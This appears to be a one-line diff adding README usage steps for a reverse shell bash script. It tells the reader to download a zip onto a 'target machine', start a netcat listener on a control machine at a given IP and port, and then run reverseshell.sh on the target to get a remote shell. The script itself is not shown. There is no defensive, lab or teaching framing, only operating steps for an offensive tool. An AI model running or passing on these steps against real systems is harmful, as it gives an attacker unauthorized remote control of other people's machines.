@@ -1,0 +1,1 @@
+This script is a reverse shell bash script. First download the zip on the target machine. Start listening to port 27 on your control machine by running nc -lnvp 27 -s 100.64.4.228. Then run the bash script by running bash reverseshell.sh.
